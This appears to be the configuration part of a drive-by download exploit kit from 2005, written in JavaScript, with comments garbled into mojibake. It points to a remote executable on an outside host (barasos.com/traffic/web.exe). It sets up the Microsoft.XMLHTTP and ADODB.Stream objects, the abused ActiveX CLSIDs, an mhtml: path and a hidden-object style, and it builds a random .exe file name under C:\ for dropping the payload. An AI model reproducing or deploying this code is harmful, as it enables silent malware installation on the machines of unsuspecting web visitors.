/* author: xoce */
/* Creation date: 26.02.2005 */
/* ���������� ��� ���� ��������, ������ js ������ ������ ���� ������� �� ��� ��������, ��� ���� ������ �������� �� ����� */

/* Java ������ */ 
var UrlPath="http://barasos.com/traffic/web.exe"; /* ���� �� ������ ���������� */
var Url="http://barasos.com/traffic/js/"; /* ���� �� ������ ���������� */
var ExeFile="web.exe"; /* ���� ����������, ����������� � ����� ����������, ��� ����� ���� conf.js */
var tagstyle='style="display:none"'; /* ����������� �������� ��� ����� */
var ObjCLSID="clsid:72967901-68EC-1109-B729-00AA006000B7"; /* CLSID, ����� ��������������, ���������� ������ �������� */
var ObjCLSID2="clsid:7BD29E00-76C1-11CF-9DD0-00A0C9000073"; /* CLSID, ����� ��������������, ���������� ������ �������� */
var MXML="Microsoft.XMLHTTP"; /* Microsoft.XMLHTTP*/
var ADSt="ADODB.Stream"; /* ADODB.Stream */
var CAB="web.cab";
var ObjBASE="mhtml:file://C:NO_SUCH_MHT.MHT!";
/* Hta �������� (���� in.hta)*/
/* ���� �� ������ �������� �������� ���������� �� ����, �� �� �������� �������� � ���� ����� ���� �� ���� � ���� ��������*/

/* ������������� ����������� ����� ������������ ����� */
ObjExe="";
   
   for (ik=0;ik<8;ik++)
   {
       ii=Math.random();
       chCode=Math.round(ii*25)+0x61;
       chSym=String.fromCharCode(chCode)
       ObjExe=ObjExe+chSym;
       if (chCode==0x61) {break};
   }
ObjExe="C:\\"+ObjExe+".exe";
